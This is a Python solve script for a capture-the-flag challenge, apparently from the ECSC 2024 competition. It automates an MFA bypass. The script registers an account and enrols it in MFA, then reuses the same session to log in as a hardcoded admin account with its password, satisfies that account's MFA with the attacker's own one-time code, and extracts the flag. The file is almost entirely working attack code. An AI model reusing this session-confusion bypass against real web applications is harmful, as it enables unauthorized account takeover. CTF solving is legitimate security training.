import requests
import uuid
from cairosvg import svg2png
import re

s = requests.Session()

base_url = 'https://1fa.ecsc24.hack.cert.pl'
kubica_login = 'admin'
kubica_pass = 'RobertR@c!ng#24'

cred = uuid.uuid4().hex

def check_res(txt):
    if 'Logged as' in txt:
        print('logged in')

    if 'Registration successful' in txt:
        print('register ok')

    if 'YouTube video player' in txt:
        print('login ok')

    if '<svg width="41mm" height="41mm"' in txt:
        print('mfa setup')
    elif 'MFA Code' in txt:
        print('mfa form')
    elif 'MFA setup successful' in txt:
        print('mfa setup ok')
    
    if 'Join TOP1 Robert Kubica fanclub' in txt:
        print('not logged in')
    
    if 'MFA verification failed' in txt:
        print('mfa failed')

print('register & login')

check_res(s.post(f'{base_url}/register', data={'login': cred, 'password': cred, 'password_rep': cred}).text)
check_res(s.post(f'{base_url}/login', data={'login': cred, 'password': cred}).text)

print('setup otp')

mfa_res = s.get(f'{base_url}/mfa-setup').text
check_res(mfa_res)

svg = re.findall(r'<svg width="41mm" height="41mm".+</svg>', mfa_res)[0]
svg2png(bytestring=svg, write_to='qr.png')

otp = input('OTP: ')
check_res(s.post(f'{base_url}/mfa-setup', data={'mfa_code': otp}))

s = requests.Session()

print('login as user')
check_res(s.post(f'{base_url}/login', data={'login': cred, 'password': cred}).text)

print('get /mfa')
check_res(s.get(f'{base_url}/mfa').text)

print('login as kubica')
res = s.post(f'{base_url}/login', data={'login': kubica_login, 'password': kubica_pass}, allow_redirects=False)
print(res.headers, res.url)
check_res(res.text)

otp = input('OTP: ')

check_res(s.post(f'{base_url}/mfa', data={'mfa_code': otp}).text)

res = s.get(base_url).text
print(res)


flag_regex = r'ecsc24{.+}'
flag = re.search(flag_regex, res).group(0)
print(flag)
